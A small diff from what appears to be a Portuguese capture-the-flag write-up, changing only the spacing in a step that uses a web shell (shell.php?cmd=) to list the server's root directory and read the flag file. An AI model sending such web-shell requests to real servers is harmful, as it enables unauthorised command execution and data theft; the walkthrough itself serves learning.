@@ -106,7 +106,7 @@ O payload hex decodifica para:
 ### 4. RCE → Flag
 
 ```bash
-GET /shell.php?cmd=ls%20/          # reconhecimento
+GET /shell.php?cmd=ls%20/              # reconhecimento
 GET /shell.php?cmd=cat%20/flag_*.txt   # captura
 ```
 
